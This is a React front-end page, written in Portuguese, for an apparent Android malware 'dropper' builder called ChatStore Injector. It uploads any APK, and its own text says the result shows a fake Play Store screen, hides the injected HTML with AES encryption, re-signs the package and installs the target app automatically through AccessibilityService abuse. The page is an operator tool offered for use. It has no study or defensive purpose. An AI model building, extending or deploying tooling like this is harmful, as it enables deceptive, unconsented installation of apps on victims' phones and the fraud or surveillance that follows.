import { useState, useRef, useCallback } from "react";
import { Link } from "wouter";
import { Button } from "@/components/ui/button";
import { Card, CardContent } from "@/components/ui/card";
import { Progress } from "@/components/ui/progress";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";

type JobStatus = "idle" | "uploading" | "processing" | "done" | "error";

interface JobResult {
  jobId: string;
  status: JobStatus;
  progress: number;
  log: string[];
  downloadUrl: string | null;
  errorMessage: string | null;
}

export default function ChatstoreInjector() {
  const [apkFile, setApkFile] = useState<File | null>(null);
  const [appName, setAppName] = useState("");
  const [isDragging, setIsDragging] = useState(false);
  const [jobResult, setJobResult] = useState<JobResult | null>(null);
  const [status, setStatus] = useState<JobStatus>("idle");
  const fileInputRef = useRef<HTMLInputElement>(null);
  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);

  const handleDrop = useCallback((e: React.DragEvent) => {
    e.preventDefault();
    setIsDragging(false);
    const file = e.dataTransfer.files[0];
    if (file?.name.endsWith(".apk")) {
      setApkFile(file);
      if (!appName) setAppName(file.name.replace(/\.apk$/i, ""));
    }
  }, [appName]);

  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      setApkFile(file);
      if (!appName) setAppName(file.name.replace(/\.apk$/i, ""));
    }
  };

  const pollStatus = (jobId: string) => {
    if (pollRef.current) clearInterval(pollRef.current);
    pollRef.current = setInterval(async () => {
      try {
        const res = await fetch(`/api/dropper/status/${jobId}`);
        const data = await res.json();
        setJobResult({
          jobId,
          status: data.status,
          progress: data.progress,
          log: data.log || [],
          downloadUrl: data.downloadUrl,
          errorMessage: data.errorMessage,
        });
        if (data.status === "done" || data.status === "error") {
          setStatus(data.status);
          clearInterval(pollRef.current!);
        }
      } catch {
        // ignore polling errors
      }
    }, 1500);
  };

  const handleSubmit = async () => {
    if (!apkFile) return;
    setStatus("uploading");
    setJobResult(null);

    const formData = new FormData();
    formData.append("apk", apkFile);
    formData.append("appName", appName || apkFile.name.replace(/\.apk$/i, ""));

    try {
      const res = await fetch("/api/dropper/chatstore", {
        method: "POST",
        body: formData,
      });
      const data = await res.json();
      if (!res.ok) throw new Error(data.error || "Erro ao iniciar processamento");

      setStatus("processing");
      setJobResult({
        jobId: data.jobId,
        status: "processing",
        progress: 0,
        log: [],
        downloadUrl: null,
        errorMessage: null,
      });
      pollStatus(data.jobId);
    } catch (err) {
      setStatus("error");
      setJobResult({
        jobId: "",
        status: "error",
        progress: 0,
        log: [],
        downloadUrl: null,
        errorMessage: (err as Error).message,
      });
    }
  };

  const reset = () => {
    if (pollRef.current) clearInterval(pollRef.current);
    setApkFile(null);
    setAppName("");
    setStatus("idle");
    setJobResult(null);
    if (fileInputRef.current) fileInputRef.current.value = "";
  };

  const isProcessing = status === "uploading" || status === "processing";

  return (
    <div className="min-h-screen bg-[#0a0a0f] text-white">
      {/* Header */}
      <header className="border-b border-white/10 px-6 py-4">
        <div className="max-w-4xl mx-auto flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="w-8 h-8 rounded-lg bg-gradient-to-br from-green-500 to-emerald-600 flex items-center justify-center text-sm font-bold">
              CS
            </div>
            <span className="font-semibold text-white">ChatStore Injector</span>
          </div>
          <nav className="flex items-center gap-4 text-sm">
            <Link href="/" className="text-white/50 hover:text-white transition-colors">APK Injector</Link>
            <Link href="/inject" className="text-white/50 hover:text-white transition-colors">⚡ Dropper Real</Link>
            <Link href="/dropper" className="text-white/50 hover:text-white transition-colors">Dropper Builder</Link>
          </nav>
        </div>
      </header>

      <main className="max-w-4xl mx-auto px-6 py-12">
        {/* Hero */}
        <div className="mb-10">
          <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-green-500/10 border border-green-500/20 text-green-400 text-xs font-medium mb-4">
            <span className="w-1.5 h-1.5 rounded-full bg-green-400 animate-pulse" />
            Modo ChatStore — Tela Fake Play Store
          </div>
          <h1 className="text-4xl font-bold mb-3 bg-gradient-to-r from-white to-white/60 bg-clip-text text-transparent">
            ChatStore Injector
          </h1>
          <p className="text-white/50 text-lg max-w-2xl">
            Injeta qualquer APK no chatstore.apk original. O app gerado exibe uma tela fake da Play Store
            e instala o APK alvo automaticamente via AccessibilityService.
          </p>
        </div>

        {/* Flow explanation */}
        <div className="grid grid-cols-4 gap-3 mb-10">
          {[
            { icon: "📤", label: "Upload APK", desc: "Envie o APK alvo" },
            { icon: "🔐", label: "Criptografia", desc: "AES-128-CBC-PBKDF2" },
            { icon: "📱", label: "Tela Play Store", desc: "HTML injetado nos .bt" },
            { icon: "⚡", label: "Auto-install", desc: "AccessibilityService" },
          ].map((step, i) => (
            <Card key={i} className="bg-white/5 border-white/10">
              <CardContent className="p-4 text-center">
                <div className="text-2xl mb-2">{step.icon}</div>
                <div className="text-xs font-semibold text-white mb-1">{step.label}</div>
                <div className="text-xs text-white/40">{step.desc}</div>
              </CardContent>
            </Card>
          ))}
        </div>

        {/* Upload area */}
        {status === "idle" && (
          <div className="space-y-6">
            {/* APK Upload */}
            <div
              className={`border-2 border-dashed rounded-xl p-10 text-center cursor-pointer transition-all ${
                isDragging
                  ? "border-green-500 bg-green-500/10"
                  : apkFile
                  ? "border-green-500/50 bg-green-500/5"
                  : "border-white/20 hover:border-white/40 bg-white/5"
              }`}
              onDragOver={(e) => { e.preventDefault(); setIsDragging(true); }}
              onDragLeave={() => setIsDragging(false)}
              onDrop={handleDrop}
              onClick={() => fileInputRef.current?.click()}
            >
              <input
                ref={fileInputRef}
                type="file"
                accept=".apk"
                className="hidden"
                onChange={handleFileChange}
              />
              {apkFile ? (
                <div>
                  <div className="text-4xl mb-3">✅</div>
                  <p className="font-semibold text-green-400">{apkFile.name}</p>
                  <p className="text-sm text-white/40 mt-1">
                    {(apkFile.size / 1024 / 1024).toFixed(1)} MB — clique para trocar
                  </p>
                </div>
              ) : (
                <div>
                  <div className="text-4xl mb-3">📱</div>
                  <p className="font-semibold text-white/80">Arraste o APK aqui</p>
                  <p className="text-sm text-white/40 mt-1">ou clique para selecionar</p>
                </div>
              )}
            </div>

            {/* App name */}
            <div className="space-y-2">
              <Label htmlFor="appName" className="text-white/70 text-sm">
                Nome do app (exibido na tela fake da Play Store)
              </Label>
              <Input
                id="appName"
                value={appName}
                onChange={(e) => setAppName(e.target.value)}
                placeholder="Ex: Chat Story"
                className="bg-white/5 border-white/20 text-white placeholder:text-white/30 focus:border-green-500/50"
              />
            </div>

            {/* Submit */}
            <Button
              onClick={handleSubmit}
              disabled={!apkFile}
              className="w-full h-12 bg-gradient-to-r from-green-600 to-emerald-600 hover:from-green-500 hover:to-emerald-500 text-white font-semibold text-base disabled:opacity-30"
            >
              🚀 Gerar ChatStore Modificado
            </Button>
          </div>
        )}

        {/* Processing */}
        {isProcessing && (
          <Card className="bg-white/5 border-white/10">
            <CardContent className="p-8">
              <div className="flex items-center gap-3 mb-6">
                <div className="w-5 h-5 border-2 border-green-500 border-t-transparent rounded-full animate-spin" />
                <span className="font-semibold text-white">
                  {status === "uploading" ? "Enviando APK..." : "Processando..."}
                </span>
              </div>
              <Progress
                value={jobResult?.progress || 0}
                className="h-2 bg-white/10 mb-4"
              />
              <div className="text-sm text-white/40 space-y-1">
                {jobResult?.log.slice(-3).map((line, i) => (
                  <p key={i}>{line}</p>
                ))}
              </div>
            </CardContent>
          </Card>
        )}

        {/* Done */}
        {status === "done" && jobResult?.downloadUrl && (
          <Card className="bg-green-500/10 border-green-500/30">
            <CardContent className="p-8">
              <div className="text-center mb-6">
                <div className="text-5xl mb-3">✅</div>
                <h2 className="text-xl font-bold text-white mb-2">ChatStore gerado com sucesso!</h2>
                <p className="text-white/50 text-sm">
                  O APK contém a tela fake da Play Store com download automático do app alvo.
                </p>
              </div>

              <div className="bg-black/30 rounded-lg p-4 mb-6 text-xs text-white/50 space-y-1">
                <p className="font-semibold text-white/70 mb-2">O que foi feito:</p>
                <p>✓ HTML da tela fake Play Store gerado com nome: <strong className="text-white/80">{appName}</strong></p>
                <p>✓ HTML criptografado com AES-128-CBC-PBKDF2</p>
                <p>✓ Assets 1.bt, 2.bt, 3.bt substituídos no chatstore.apk</p>
                <p>✓ APK assinado com uber-apk-signer</p>
                <p>✓ APK alvo hospedado no servidor para download automático</p>
              </div>

              <div className="flex gap-3">
                <Button
                  asChild
                  className="flex-1 bg-green-600 hover:bg-green-500 text-white font-semibold"
                >
                  <a href={jobResult.downloadUrl} download>
                    ⬇️ Baixar ChatStore Modificado
                  </a>
                </Button>
                <Button
                  onClick={reset}
                  variant="outline"
                  className="border-white/20 text-white/70 hover:bg-white/10"
                >
                  Novo
                </Button>
              </div>
            </CardContent>
          </Card>
        )}

        {/* Error */}
        {status === "error" && (
          <Card className="bg-red-500/10 border-red-500/30">
            <CardContent className="p-8 text-center">
              <div className="text-4xl mb-3">❌</div>
              <h2 className="text-lg font-bold text-white mb-2">Erro no processamento</h2>
              <p className="text-red-400 text-sm mb-6">{jobResult?.errorMessage}</p>
              <Button onClick={reset} variant="outline" className="border-white/20 text-white/70 hover:bg-white/10">
                Tentar novamente
              </Button>
            </CardContent>
          </Card>
        )}
      </main>
    </div>
  );
}
